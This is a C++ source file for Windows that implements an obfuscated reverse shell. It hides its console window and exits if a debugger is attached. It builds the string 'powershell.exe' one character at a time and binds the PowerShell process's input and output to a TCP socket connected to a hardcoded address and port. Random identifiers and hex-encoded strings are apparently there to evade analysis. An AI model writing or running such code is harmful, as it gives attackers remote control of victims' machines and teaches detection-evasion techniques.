#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <tchar.h>
#include <iostream>
using namespace std;
#pragma comment(lib, "ws2_32.lib")
const char RyzU1[] = { '\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e' ,'\x31',0 };
#define SCQCd 19482
void D3B9o(HWND wVFqf) {
	ShowWindow(wVFqf, 0x0);
    return;
}	
int main() {
	HWND Tzuoq;
	Tzuoq = GetConsoleWindow();
    D3B9o(Tzuoq);
	HANDLE cmS5P;
	cmS5P = GetCurrentProcess();
	BOOL wOEhN;
	wOEhN = FALSE;
	if (CheckRemoteDebuggerPresent(cmS5P, &wOEhN)) {
		if (wOEhN) {
			HWND XZL9Y;
			printf("ZnVjayB5b3UgbW90aGVyIQ==");
			XZL9Y = GetForegroundWindow();
			SendMessage(XZL9Y, 0x10, NULL, NULL);
			exit(EXIT_SUCCESS);
		}
	}	
	WORD ZZXtx;
    WSADATA qICxG;
    SOCKET Do14a;
    struct sockaddr_in RkL9r;
    STARTUPINFO cDJjc;
    PROCESS_INFORMATION Ckib4;
	ZZXtx = MAKEWORD(2, 2);
	int Kk8wv;
    Kk8wv = WSAStartup(ZZXtx, &qICxG);
	if (Kk8wv!=0) {
		return 1;
	}
	BYTE j6468;
	WORD Ag7wo;
	Ag7wo = qICxG.wVersion;
	j6468 = LOBYTE(Ag7wo);
	BYTE E9OXf;
	E9OXf = HIBYTE(Ag7wo);
	if ((int)E9OXf != 2 || (int)j6468 != 2) {
		WSACleanup();
		return 1;
	}
    Do14a = WSASocketA(0x2, 0x1, 0x6, nullptr, 0x0, 0x0);
	RkL9r.sin_family = AF_INET;
	RkL9r.sin_addr.s_addr = inet_addr(RyzU1);
	RkL9r.sin_port = htons(SCQCd);
    connect(Do14a, (sockaddr*)&RkL9r, sizeof(RkL9r));
    SecureZeroMemory(&cDJjc, sizeof(cDJjc));
	cDJjc.cb = sizeof(cDJjc);
	cDJjc.hStdOutput = (HANDLE)Do14a;
	cDJjc.dwFlags = 0x101;
	cDJjc.cbReserved2 = 0x0;
	cDJjc.lpDesktop = const_cast<LPWSTR>(_T("Default"));
	cDJjc.lpReserved2 = nullptr;
	cDJjc.hStdError = (HANDLE)Do14a;
	cDJjc.lpTitle = nullptr;
	cDJjc.wShowWindow = 0x0;
	cDJjc.hStdInput = (HANDLE)Do14a;
	cDJjc.lpReserved = nullptr;
	constexpr int Xac06 = 2 << 9;
	wchar_t i0iMh[Xac06];
	wcscpy_s(i0iMh, Xac06, L"p");
	wcscat_s(i0iMh, Xac06, L"o");
	wcscat_s(i0iMh, Xac06, L"w");
	wcscat_s(i0iMh, Xac06, L"e");
	wcscat_s(i0iMh, Xac06, L"r");
	wcscat_s(i0iMh, Xac06, L"s");
	wcscat_s(i0iMh, Xac06, L"h");
	wcscat_s(i0iMh, Xac06, L"e");
	wcscat_s(i0iMh, Xac06, L"l");
	wcscat_s(i0iMh, Xac06, L"l");
	wcscat_s(i0iMh, Xac06, L".");
	wcscat_s(i0iMh, Xac06, L"e");
	wcscat_s(i0iMh, Xac06, L"x");
	wcscat_s(i0iMh, Xac06, L"e");
	wcscat_s(i0iMh, Xac06, L" ");
	wcscat_s(i0iMh, Xac06, L"-");
	wcscat_s(i0iMh, Xac06, L"n");
	wcscat_s(i0iMh, Xac06, L"o");
	wcscat_s(i0iMh, Xac06, L"l");
	wcscat_s(i0iMh, Xac06, L"o");
	wcscat_s(i0iMh, Xac06, L"g");
	wprintf(L"%ls",i0iMh);
    CreateProcess(
        NULL,
        i0iMh,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &cDJjc,
        &Ckib4
    );
    WaitForSingleObject(Ckib4.hProcess, INFINITE);
	HANDLE LPGig;
	LPGig = Ckib4.hProcess;
	if (LPGig && LPGig != INVALID_HANDLE_VALUE) {
		CloseHandle(LPGig);
		WSACleanup();
	}
	HANDLE AigS2;
	AigS2 = Ckib4.hThread;
	if (AigS2 && AigS2 != INVALID_HANDLE_VALUE) {
		CloseHandle(Ckib4.hThread);
		WSACleanup();
	}
    closesocket(Do14a);
    WSACleanup();
    return 0;
}